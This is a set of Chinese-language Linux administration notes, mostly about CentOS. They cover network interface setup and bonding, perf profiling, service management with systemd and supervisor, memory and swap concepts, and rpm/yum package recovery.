查看虚拟网卡信息：cat /sys/devices/virtual/net/<br>
查看网卡特性：ethtool -k enp0s3 | grep offload  
关闭网卡特性： sudo ethtool -K enp0s3 tso off
### 设定网卡固定IP
固定IP地址、DNS、默认路由
```
cat > /etc/sysconfig/network-scripts/ifcfg-ens33 << EOF
> TYPE="Ethernet"
> PROXY_METHOD="none"
> BROWSER_ONLY="no"
> BOOTPROTO="static"
> IPADDR=192.168.19.130
> PREFIX=24
> DNS1=192.168.19.2
> GATEWAY=192.168.19.2
> DEFROUTE="yes"
> IPV4_FAILURE_FATAL="no"
> IPV6INIT="yes"
> IPV6_AUTOCONF="yes"
> IPV6_DEFROUTE="yes"
> IPV6_FAILURE_FATAL="no"
> IPV6_ADDR_GEN_MODE="stable-privacy"
> NAME="ens33"
> UUID="050e8c7c-f157-45a4-b511-69efafab4bb8"
> DEVICE="ens33"
> ONBOOT="yes"
> EOF
```
  重启网卡：/etc/init.d/network restart
  可以使用命令nmcli con来查看网卡UUID，如果没有该命令centos系统可通过命令yum -y install NetworkManager来安装

### centos7修改网卡名称
1. 创建网卡自定义命名文件/etc/udev/rules.d/70-persistent-net.rules, 并填写需要定义的网卡信息，主要是MAC地址和网卡名称NAME, 这里MAC地址不能更改，还是之前的网卡MAC.
```
SUBSYSTEM=="net", ACTION=="add", DRIVERS=="?*", ATTR{address}=="08:94:ef:2a:88:5c", ATTR{type}=="1", KERNEL=="eth*", NAME="enp3s0f0"
SUBSYSTEM=="net", ACTION=="add", DRIVERS=="?*", ATTR{address}=="08:94:ef:2a:88:5d", ATTR{type}=="1", KERNEL=="eth*", NAME="enp3s0f1"
SUBSYSTEM=="net", ACTION=="add", DRIVERS=="?*", ATTR{address}=="08:94:ef:2a:88:5e", ATTR{type}=="1", KERNEL=="eth*", NAME="enp3s0f2"
SUBSYSTEM=="net", ACTION=="add", DRIVERS=="?*", ATTR{address}=="08:94:ef:2a:88:5f", ATTR{type}=="1", KERNEL=="eth*", NAME="enp3s0f3"
SUBSYSTEM=="net", ACTION=="add", DRIVERS=="?*", ATTR{address}=="98:be:94:5f:be:90", ATTR{type}=="1", 
```

2. 修改或新建网卡配置文件，网卡名字和上面自定义的网卡名保持一致
/etc/sysconfig/network-scripts下面，例如要把eno1改为enp3s0f2，需要重命名文件并修改文件中关于eno1的关键字为enp3s0f2

3. 禁用centos7默认网卡命名规则,修改文件/etc/default/grub，在GRUB_CMDLINE_LINUX值中添加net.ifnames=0 biosdevname=0.修改后如下：
```
GRUB_TIMEOUT=5
GRUB_DISTRIBUTOR="$(sed 's, release .*$,,g' /etc/system-release)"
GRUB_DEFAULT=saved
GRUB_DISABLE_SUBMENU=true
GRUB_TERMINAL_OUTPUT="console"
GRUB_CMDLINE_LINUX="crashkernel=auto rd.lvm.lv=centos/root rd.lvm.lv=centos/swap rhgb quiet net.ifnames=0 biosdevname=0"
GRUB_DISABLE_RECOVERY="true"
```
然后执行如下命令修改内核参数
```grub2-mkconfig -o /boot/grub2/grub2.cfg```

4. 重启服务器生效

### 网卡绑定
1. 加载bonding模块： modprobe bonding； lsmod |grep bonding 
2. 创建虚拟的绑定网卡，例如 bond0:
```
[root@bogon network-scripts]# cat ifcfg-bond0 
DEVICE=bond0
ONBOOT=YES
BOOTPROTO=static
IPADDR=172.20.0.51
PREFIX=24
BONDING_OPTS="miimon=100 mode=1"
```
3. 绑定两个网卡，主备模式，把原有的配置ip信息去掉
```
[root@bogon network-scripts]# cat ifcfg-enp35s0f0
NAME=enp35s0f0
DEVICE=enp35s0f0
ONBOOT=yes
BOOTPROTO=none
MASTER=bond0
SLAVE=yes
[root@bogon network-scripts]# 
[root@bogon network-scripts]# cat ifcfg-enp35s0f1
NAME=enp35s0f1
DEVICE=enp35s0f1
ONBOOT=yes
BOOTPROTO=none
MASTER=bond0
SLAVE=yes
[root@bogon network-scripts]# 
```
4. 重启网络，后如下所示：
```
enp35s0f0和enp35s0f1绑定成bond0网卡

6: enp35s0f0: <BROADCAST,MULTICAST,SLAVE,UP,LOWER_UP> mtu 1500 qdisc mq master bond0 state UP qlen 1000
    link/ether e8:61:1f:39:4c:78 brd ff:ff:ff:ff:ff:ff
7: enp35s0f1: <BROADCAST,MULTICAST,SLAVE,UP,LOWER_UP> mtu 1500 qdisc mq master bond0 state UP qlen 1000
    link/ether e8:61:1f:39:4c:78 brd ff:ff:ff:ff:ff:ff
10: bond0: <BROADCAST,MULTICAST,MASTER,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP qlen 1000
    link/ether e8:61:1f:39:4c:78 brd ff:ff:ff:ff:ff:ff
    inet 172.20.0.51/24 brd 172.20.0.255 scope global bond0
       valid_lft forever preferred_lft forever
    inet6 fe80::ea61:1fff:fe39:4c78/64 scope link 
       valid_lft forever preferred_lft forever

```

### 网卡解绑
```
1. 查看绑定情况：cat /proc/net/bonding/bond0
2. 删除绑定网卡配置 /etc/sysconfig/network-scripts/ifcfg-bond0 
3. 修改两块真实网卡信息 /etc/sysconfig/network-scripts/ifcfg-enp35s0f0 和 ifcfg-enp35s0f1
```



# lspci
list all PCI devices，目前主机上面所有的硬件配备<br>
例：lspci | grep eth<br>
命令主要会使用的两个参数
```
lspci  -[vvn]选项与参数：
-v     ：显示更多的 PCI 接口装置的详细信息
-vv ：比 -v 还要更详细的信息
-n     ：直接观察 PCI 的 ID 而不是厂商名称
```
lspci列出的都是芯片信息，所以看起来有点吃力，这些信息大部分就是各个板卡上芯片上印刷的型号，比如说你有Intel 440BX/ZX/DX - 82443BX/ZX/DX总线控制器，另外还有Intel 440BX/ZX/DX - 82443BX/ZX/DX AGP总线控制器，它们是在一块芯片上，但是lspci会一条一条分开列出
```
[root@www ~]# lspci
#不必加上任何选项，就能够显示出目前的硬件配备为何
Host bridge:                        <==主板芯片
VGA compatible controller    <==显卡
Audio device                            <==音频设备
PCI bridge                                <==接口插槽
USB Controller                        <==USB控制器
ISA bridge                                
IDE interface                            
SMBus                                       
Ethernet controller                <==网卡
lscpu
```
 socket就是主板上插cpu的槽的数目，也就是可以插入的物理CPU的个数。
core就是我们平时说的“核“，每个物理CPU可以双核，四核等等。
thread就是每个core的硬件线程数，即超线程
 
输入命令cat /proc/cpuinfo 查看physical id有几个，上述结果显示只有0，所以只有一个物理cpu；查看processor有几个，上述结果显示有0和1两个，所以有两个逻辑cpu。

 - 查看网卡型号:   lspci | grep Ethernet
 - 查看网卡驱动:   ethtool -i eth1 查看输出的第一行driver
 
# free
查看内存。displays the total amount of free and used physical and swap memory in the system, as well as the buffers and caches used by the kernel. The information is gathered by pars-       ing /proc/meminfo.
```
-k   --kilo
-m  --mega
```

# dmesg
命令显示linux内核的环形缓冲区信息，我们可以从中获得诸如系统架构、cpu、挂载的硬件，RAM等多个运行级别的大量的系统信息
源代码
rpm -qf `which ping` 查看，找到ping属于哪个软件包，下载软件包的源代码就可以看了

# perf
linux内核支持的软件性能分析的工具, perf 可以对指定的进程或者事件进行采样，并且还可以用调用栈的形式，输出整个调用链上的汇总信息。使用前需要安装符号表,如果用RPM包注意要和内核版本一致
```
# Ubuntu
$ apt-get install linux-image-`uname -r`-dbgsym
$ apt install linux-tools-common 
# CentOS
$ yum --enablerepo=base-debuginfo install -y kernel-debuginfo-$(uname -r)
$ yum install perf 

```
```
# 采样30s后退出
$ perf record -a -g -- sleep 60
$ perf record -a -g -p 9 -- sleep 30
$ perf report
```  
在上述命令结束后，执行 perf report命令就可以得到 perf 的汇总报告. 展开可以看到调用链。另外，针对 perf 汇总数据的展示问题，可构造火焰图，需要安装FlameGraph工具。  
```
git clone https://github.com/brendangregg/FlameGraph.git   
perf script -i perf.data &> perf.unfold                        //生成脚本文
FlameGraph/stackcollapse-perf.pl perf.unfold &> perf.folded           
FlameGraph/flamegraph.pl perf.folded > perf.svg    
用浏览器打开Svg文件即可。
```
 - y 轴表示调用栈，每一层都是一个函数。调用栈越深，火焰就越高，顶部就是正在执行的函数，下方都是它的父函数。
 - x 轴表示抽样数，如果一个函数在 x 轴占据的宽度越宽，就表示它被抽到的次数多，即执行的时间长。注意，x 轴不代表时间，而是所有的调用栈合并后，按字母顺序排列的。
 - 火焰图就是看顶层的哪个函数占据的宽度最大。只要有"平顶"（plateaus），就表示该函数可能存在性能问题。
 - 颜色没有特殊含义，因为火焰图表示的是 CPU 的繁忙程度，所以一般选择暖色调。

$ perf probe --add do_sys_open //添加探针
$ perf record -e probe:do_sys_open -aR sleep 10 //采样
$ perf record -C 32 -g -- sleep 10 // 针对CPU32采样（-a参数表示所有CPU）10秒钟，-g 是指 call-graph enable，也就是记录函数调用关系
$ perf record  -e cycles -c 10000 -- sleep 1 // 针对cycles事件每发生10000次采样1次，这样采样1秒钟。如果不指定事件默认采集所有Hardware event cycles
$ perf record -e cycles -F 99 -- sleep 1 ，就是指采样每秒钟做 99 次// F表示采样每发生99次事件做一次采样
$ perf stat -e page-faults -- sleep 1 // 查看1秒内事件page-faults发生了多少次
$ perf script //查看采样结果
$ perf probe -V do_sys_open //可以查看系统调用do_sys_open的参数
$ perf trace --no-syscalls --event 'net:*' ping <ip> -c1  // 可用于定位ping不通的问题
```

# dig, nslookup 查看域名方法


# 压缩，解压缩
## *.gz文件
Linux压缩保留源文件的方法：
gzip –c filename > filename.gz
Linux解压缩保留源文件的方法：
gunzip –c filename.gz > filename
gunzip不保留源文件的解压方法：
gunzip filename.gz

## *tar.gz文件
  tar cvf name.tar.gz name/
  tar xvf name.tar.gz

  tar zcvf name.tar.gz name/
  tar zxvf name.tar.gz

## *.tar文件
*.tar: tar -xf
*.tar.gz: tar zxf

## *.xz文件解压
*.xz: xz -d 

## *.zip
*解压： unzip xxx.zip
*压缩： zip -r xxx.zip xxx/


# 查看系统是否是虚拟机
## Windows：
在CMD里输入：Systeminfo | findstr /i "System Model"
如果System Model：后面含有Virutal就是虚拟机，其他都是物理机
或者用powershell命令：get-wmiobject win32_computersystem | fl model
## Linux：
在bash里输入：dmidecode -s system-product-name
或者lshw -class system
或者dmesg | grep -i virtual
- hostnamectl 查看本机信息，包括主机名、硬件号、软件版本、体系结构等, hostnamectl set-hostname xxx 修改主机名
- localectl   查看本地化设置，时区语言等
- timedatectl 查看本地时间、时区等，也可用于配置时区信息，eg: timedatectl set-timezone Asia/Shanghai
- rpm -q centos-release 查看centos版本信息

# 重装系统
## 查看系统安装时间
```
ls -lact --full-time /etc/|tail -1|awk '{print $6,$7}'
```
## 系统时钟相关
 HZ 是什么意思呢？ 系统ticks 是按照固定频率发生的，在我们的 Linux 系统里 1 秒钟是 100 次，那么 HZ 就是 1 秒钟里 ticks 的次数，这里值是 100。可以通过命令`getconf CLK_TCK`来查看HZ数值。

## 查看linux版本信息
- uname -ra
- cat /proc/version
- 查看gcc版本： gcc -v
- 查看glibc版本： ldd --version

## 制作安装U盘
 1. 安装最新最新版ultraISO，试用版也可以
 2. 下载centos7 iso文件，并用ultralISO写入磁盘。  
    先打开目标文件，再点击【启动】→点击【写入硬盘映像】→选择【硬盘驱动器】（选为U盘）→选择【写入方式】→点击【写入】
 3. 也可以使用软件ventoy,该软件打开就能用，安装到U盘后，可以把多个iso文件同时拷贝到U盘，支持多系统启动盘   

## 使用U盘重装centos7
 1. 插拔U盘，使用ls /dev命令查看是U盘设配名，假设u盘设配名为sdc4
 2. 不通的主板按键进入安装界面，以F11为例，出现界面Install Centos7选项，这时根据界面提示按Tab或者e键编辑安装配置。修改相关句子为vmlinuz initrd=initrd.img inst.stage2=hd:/dev/sdc4 quiet
 3. 根据提示按ctrl+x保存配置进行安装
 4. 选择Date和安装类行（minimal,勾选DevelopmentTool）
 5. 选择Install Destination, 如果提示不行，多试试按键找到Reclaim Space清空硬盘再试
 6. 如果选择磁盘后报错，说明磁盘未准备好。需要对磁盘进行RAID，并进行格式化。以华为2288HV5为例，按DEL键进入DeviceManager-->AVAGO MegaRAID. 先Clear,然后选择所有好的硬盘进行创建virtual device.最后查看这些设备进行FastFormat. 也可以到DeviceManager-->AVAGO MegaRAID-->create xx的里面Default Initialization选fast（这里只有在创建磁盘的时候才能选fast. 注意观察硬盘是否都是好的，要把坏的硬盘拿出来进行创建RAID）
 https://blog.csdn.net/qq_21410965/article/details/124648158  

# 守护进程方法
## systemd
历史上，Linux 的启动一直采用init进程。
```
$ sudo /etc/init.d/apache2 start
# 或者
$ service apache2 start
```
systemd 是centos系统默认的进程守护工具.CentOS6之前系统的服务用SysV控制，CentOS7改为systemd控制。使用systemd 需要在/usr/lib/systemd/system/ 目录下创建一个脚本skynet-server.service，内容如下：
```
[Unit]
Description=Skynet API Server
After=network.target
After=etcd.service

[Service]
EnvironmentFile=-/etc/skynet/skynet-server.conf
ExecStart=/usr/bin/skynet-server
Restart=always
LimitNOFILE=102400


[Install]
WantedBy=multi-user.target

配置好service文件后可以使用命令
systemctl start skynet-server    //启动程序
systemctl stop skynet-server    //停止程序
systemctl restart skynet-server //重启程序
```
### ￼journalctl 查看日志
 - journalctl -ru kubelet 查看kubelet当前日志
 - journalctl -fu kubelet  实时查看kubelet日志更新
 - journalctl -k  查看内核日志（不显示应用日志）
  > - 比dmesg功能更强大，dmesg 是 print or control the kernel ring buffer
 - journalctl -b  查看系统本次启动的日志
 - journalctl --since="2012-10-30 18:17:16" 
 - journalctl --since "20 min ago"
 - journalctl --since yesterday
 - journalctl --since "2015-01-10" --until "2015-01-11 03:00"
 - journalctl --since 09:00 --until "1 hour ago"
 - journalctl _PID=1 查看指定进程的日志
 - journalctl -u nginx.service -u php-fpm.service --since today 合并显示多个 Unit 的日志

## supervisor 
1. 官网安装使用手册： http://supervisord.org/installing.html
   建议直接读官网文档，有一种可以联网直接安装supervisor的方法。以下是不能联网的方法:
setuptools (latest) from https://pypi.python.org/pypi/setuptools.
meld3 (latest) from https://pypi.python.org/pypi/meld3.
Copy these files to removable media and put them on the target machine. Install each onto the target machine as per its instructions. This typically just means unpacking each file and invoking python setup.py install in the unpacked directory. Finally, run supervisor’s python setup.py install.
Get supervisor from https://pypi.org/project/supervisor/

2. 创建配置文件
 echo_supervisord_conf >/etc/supervisord.conf
 mkdir /etc/supervisord.conf.d
修改配置
 [include]
 files = /etc/supervisord.conf.d/*.conf

新建管理的应用
 cd /etc/supervisord.conf.d
 vim beepkg.conf

配置文件：
 [program:beepkg]
 directory = /opt/app/beepkg
 command = /opt/app/beepkg/beepkg
 autostart = true
 startsecs = 5
 user = root
 redirect_stderr = true
 stdout_logfile = /var/log/supervisord/beepkg.log

3. 启动supervisor程序
Supervisord 安装完成后有两个可用的命令行 supervisord 和 supervisorctl，命令使用解释如下：
supervisord，初始启动 Supervisord，启动、管理配置中设置的进程。
supervisorctl stop programxxx，停止某一个进程(programxxx)，programxxx 为 [program:beepkg] 里配置的值，这个示例就是 beepkg。
supervisorctl start programxxx，启动某个进程
supervisorctl restart programxxx，重启某个进程
supervisorctl stop groupworker: ，重启所有属于名为 groupworker 这个分组的进程(start,restart 同理)
supervisorctl stop all，停止全部进程，注：start、restart、stop 都不会载入最新的配置文件。
supervisorctl reload，载入最新的配置文件，停止原有进程并按新的配置启动、管理所有进程。
supervisorctl update，根据最新的配置文件，启动新配置或有改动的进程，配置没有改动的进程不会受影响而重启。

## runsvdir
ubuntu, debian系统使用的守护进程
需要在/etc/init.d/enable/下面创建需要守护的进程的文件夹例如skynet-manager，然后在里面写run脚本。
如果把文件夹skynet-manager移出/etc/init.d/enable/， 那么进程skynet-manager会自动停止；反之，移到该文件下，进程会自动被拉起。

## chkconfig
redhat使用的一种开机自启动方式.
 - chkconfig --list #列出所有的系统服务
 - chkconfig --add httpd #增加httpd服务
 - chkconfig httpd on #开机自启动httpd服务
 - chkconfig --del httpd #删除httpd服务
 - chkconfig --level httpd 2345 on #设置httpd在运行级别为2、3、4、5的情况下都是on（开启）的状态
 - chkconfig --list mysqld #列出mysqld服务设置情况
 - chkconfig --level 35 mysqld on #设定mysqld在等级3和5为开机运行服务，--level 35表示操作只在等级3和5执行，on表示启动，off表
系统开机时启动的部分服务存储在/etc/init.d/目录下。我们可以把需要开机启动的服务放在这个目录下然后用chkconfig来管理。
```# chkconfig: 2345 20 80```
表示脚本应该在运行级 2,3,4,5 启动，启动优先权为20，停止优先权为80。  
<font color='red'>注意，这里脚本的名称不能和已经存在的Systemctl管理的服务名称重名！</font>  

# vimdiff 
自带的文本比较与merge工具

# 进程vs线程
1. 进程是资源分配的基本单位，线程是资源调度的基本单位；
2. 进程间相互独立，线程之间有依赖关系，进程可独立存在，线程必须寄生在进程中；
3. 线程占有的资源都是不共享的，其中包括：栈，寄存器、状态，程序计数器；线程间共享的是进程的资源有堆，全局变量.data区，静态变量.bss区和代码区text.
4. 进程间通信方法：信号量(semaphore), 锁（原子操作、自旋锁、读写锁、互斥锁），信号（signal）、消息队列，共享内存，管道和套接字
    线程间通信：锁、信号量、信号、全局变量
```
 ps -T -p <pid> //查看指定进程下的线程
 top -Hp  <pid> //查看指定进程下的线程
```    

# 后台进程
后台进程必须与其运行前的环境隔离开来，这些环境包括未关闭的文件描述符、控制终端、会话和进程组、工作目录以及文件创建掩码等。这些环境通常是后台进程从执行它的父进程中继承下来的。但是后台进程在终端关闭的时候会退出，最好使用守护进程。

# cache / buffer / swap / DMA/mmap
## cache
Cache：缓冲区，高速缓存，是位于CPU与主内存间的一种容量较小但速度很高的存储器。例如总是从内存读一个数据，很频繁，为了减少时间，把这部分内容放在cache中，下次直接从cache中读取. 
## buffer
Buffer：缓冲区，一个用于存储速度不同步的设备或优先级不同的设备之间传输数据的区域。例如内存总是向磁盘写文件，但是每次都写的很小的内容，那么可以先把这些文件先放到一个篮子里buffer,等攒得多了再向磁盘写入。buffer是块设备的读写缓冲区
## swap
swap:  交互分区，也就是从硬盘划分的虚拟内存，当物理内存不够用的时候会把缓存区（cache/buffer）的一些进程到swap中。
### swappiness参数
也就是/proc/sys/vm/swappiness 的值,用于决定系统将会有多频繁地使用交换分区。常常有3个取值：0,60,100
两种内存类型 Page Cache 和 RSS ，在有磁盘文件访问的时候，Linux 会尽量把系统的空闲内存用作 Page Cache 来提高文件的读写性能。在没有打开 Swap 空间的情况下，一旦内存不够，这种情况下就只能把 Page Cache 释放了，而 RSS 内存是不能释放的。在 RSS 里的内存，大部分都是没有对应磁盘文件的内存，比如用 malloc() 申请得到的内存，这种内存也被称为匿名内存（Anonymous memory）。那么当 Swap 空间打开后，可以写入 Swap 空间的，就是这些匿名内存。  
所以在 Swap 空间打开的时候，问题也就来了，在内存紧张的时候，Linux 系统怎么决定是先释放 Page Cache，还是先把匿名内存释放并写入到 Swap 空间里呢？我们一起来分析分析，都可能发生怎样的情况。最可能发生的是下面两种情况：第一种情况是，如果系统先把 Page Cache 都释放了，那么一旦节点里有频繁的文件读写操作，系统的性能就会下降。还有另一种情况，如果 Linux 系统先把匿名内存都释放并写入到 Swap，那么一旦这些被释放的匿名内存马上需要使用，又需要从 Swap 空间读回到内存中，这样又会让 Swap（其实也是磁盘）的读写频繁，导致系统性能下降。显然，我们在释放内存的时候，需要平衡 Page Cache 的释放和匿名内存的释放，而 swappiness，就是用来定义这个平衡的参数。
- 当该值为100时：匿名内存和 Page Cache 内存的释放比例就是 100: 100，也就是等比例释放了。
- 当该值为60时：该值为缺省值，匿名内存和 Page Cache 内存的释放比例就是 60:140，Page Cache 内存的释放要优先于匿名内存。
- 当该值为0时：也不能完全禁止 Swap 分区的使用，就是说在内存紧张的时候，也会使用 Swap 来回收匿名内存。
## DMA
DMA：是一种无需CPU的参与就可以让外设和系统内存之间进行双向数据传输的硬件机制。使用DMA可以大大提高IO吞吐率。
## mmap
mmap: 是一种内存映射文件的方法，即将一个文件或者其它对象映射到进程的地址空间，实现文件磁盘地址和进程虚拟地址空间的一一对映关系。从而实现写内存就可以写文件，大大提高速度。

# 页表
页表是将虚拟地址映射到物理地址的数据结构。

# 环境变量
## 查看所有环境变量 env
## 设置环境便令 export GO=PATH
## 取消环境变量 unset GO
## 自动初始化环境变量
环境变量放在/root/.bashrc文件中，当登录一个终端时，会执行这个文件中的命令

常在/etc/profile文件中修改环境变量，在这里修改的内容是对所有用户起作用的。使用修改.bashrc文件进行环境变量的编辑，只对当前用户有用。使用修改 /etc/profile 文件进行环境变量的编辑，是对所有用户有用，并且是永久有效的。  

另外，/etc/init.d 和/etc/rc.local 都是开机自启动脚本，其中 /etc/init.d 类似于注册器一般用来拉起系统进程和服务；/etc/rc.loca是在系统初始化级别脚本运行之后再执行的，常用于客制化自启动服务。/etc/rc.d/init.d/ 会自动同步和/etc/init.d/一样。

注意：
- 要给该文件添加可执行权限否则开机不生效
- 对于ubuntu系统要开启rc.local服务, sudo systemctl status rc-local 查看该服务状态  
  > - 先执行systemctl enable rc-local; systemctl start rc-local;
  > - chmod +x /etc/rc.local
  > - 如果没有/etc/rc.local则创建一个，并且第一句要是#!/bin/bash;然后再重启服务
## 命令重命令
```
alias rm='rm -i' //rename command rm
查看所有别名命令： alias
```

# OOM
## oom_score_adj和oom_score
假设我们选择在出现OOM状况的时候杀死进程，那么一个很自然的问题就浮现出来：到底干掉哪一个呢？内核的算法倒是非常简单，那就是打分（oom_score，注意，该参数是read only的），找到分数最高的就OK了.

对某一个task进行打分（oom_score）主要有两部分组成，一部分是系统打分，主要是根据该task的内存使用情况。另外一部分是用户打分，也就是oom_score_adj了，该task的实际得分需要综合考虑两方面的打分。如果用户将该task的 oom_score_adj设定成OOM_SCORE_ADJ_MIN（-1000）的话，那么实际上就是禁止了OOM killer杀死该进程。

oom_score_adj的取值范围是-1000～1000，0表示用户不调整oom_score，负值表示要在实际打分值上减去一个折扣，正值表示要惩罚该task，也就是增加该进程的oom_score,例如如果oom_score_adj设定-500，那么表示实际分数要打五折（基数是totalpages），也就是说该任务实际使用的内存要减去可分配的内存上限值的一半。

# rpm
 - rpm -qa|grep kube 查找所有kube相关软件
 - rpm -e xxx 删除指定软件
 - rpm -ivh 包全名 //安装软件
 - rpm --force //强制安装: 覆盖原版本，忽略包之间的冲突
 - rpm --nodeps // 不验证包之间的依赖
 


# yum 安装
有时候卸载linux软件会把yum工具误删，可通过如下方法安装
```
rpm包可到http://mirror.centos.org/centos/7/os/x86_64/Packages/  和 https://dl.fedoraproject.org/pub/epel/7/x86_64/Packages/e/ 找
安装如下包：
http://dl.fedoraproject.org/pub/epel/7/x86_64/Packages/e/epel-release-7-11.noarch.rpm
http://mirror.centos.org/centos/7/os/x86_64/Packages/yum-3.4.3-158.el7.centos.noarch.rpm
http://mirror.centos.org/centos/7/os/x86_64/Packages/yum-plugin-fastestmirror-1.1.31-45.el7.noarch.rpm
http://mirror.centos.org/centos/7/os/x86_64/Packages/yum-metadata-parser-1.1.4-10.el7.x86_64.rpm
http://mirror.centos.org/centos/7/os/x86_64/Packages/libxml2-2.9.1-6.el7_2.3.x86_64.rpm

可能在安装yum和yum-plugin-fastestmirror时互依赖问题，可通过同时安装方式解决：
rpm -ivh "yum-3.4.3-168.el7.centos.noarch.rpm" "yum-plugin-fastestmirror-1.1.31-54.el7_8.noarch.rpm"

```

# yum源更新
```
mv /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.backup
cd /etc/yum.repos.d/
wget http://mirrors.163.com/.help/CentOS7-Base-163.repo
修改上面下载的文件中的releasever为7，可使用vim命令:%s/$releasever/7/g， 注意centos7就改为7，centos6改为6
yum makecache
yum -y update
```

# chmod
Linux/Unix 的文件调用权限分为三级 : 文件所有者（Owner）、用户组（Group）、其它用户（Other Users）, 每一级用三个位表示：rwx，分别表示是否可读、可写、可执行。

```chmod abc file```

其中a,b,c各为一个数字，分别表示User、Group、及Other的权限。

r=4，w=2，x=1
若要 rwx 属性则 4+2+1=7；
若要 rw- 属性则 4+2=6；
若要 r-x 属性则 4+1=5。
因此，640属性的文件表示owner用户可读可写不可执行；group用户可读不可写不可执行；other用户不可读不可写不可执行；

# privilege
可以通过https://man7.org/linux/man-pages/man7/capabilities.7.html 查看Linux 的所有的 capabilities 特权
```
用特权模式运行容器
docker run --name iptables --privileged -it registry/iptables:v1 bash

getcap /usr/bin/ping 查看ping进程当前cap
setcap cap_net_admin,cap_net_raw+p /usr/bin/ping 设置ping进程cap
```


# 如何找到疯狂打印日志的进程
```
top // 找到iowait较高或者内存占用较高的进程号，确认不是CPU负载较大

iostat -x -d 1 // 查看磁盘IO使用率，iostat用yum install sysstat安装，确认是磁盘IO问题
或者vmstat   // 相对于iostat命令，vmstat可以同时提供CPU、内存和IO的使用情况，但信息不细致。

pidstat -d 1 // 找到读写操作较多的进程

strace -p <PID> // 找到该进程的系统调用，包括内存映射，读写，关闭句柄等. 用yum install strace 安装

strace -fp <PID> // 显示所有子进程的系统调用。有时候写操作是进程的子进程，用上一条命令看不出来
filetop -C // filetop 是bcc软件包的一部分，基于eBPF的跟踪内核中文件的读写情况，并输出线程 ID（TID）、读写大小、读写类型以及文件名称。 安装方法见https://github.com/iovisor/bcc
opensnoop // opensnoop也是 bcc 软件包，可以动态跟踪内核中的 open 系统调用

lsof -p <PID> // 找到该进程打开的文件。用 yum install lsof 安装。这里注意lsof后面只能跟进程号，不能跟线程号

```
另外，fio是最常用的文件系统和磁盘IO性能基准测试工具，安装命令yum install -y fio

# Too many open files问题
```
ulimit -a //查看当前可打开文件数
ulimit -n 1048576 //临时配置可打开文件数
永久修改方法，修改文件/etc/security/limits.conf
*               soft nofile           1048576
*               hard nofile           1048576

```
||
|:--|

# file 
file -h /bin/sh //显示文件类型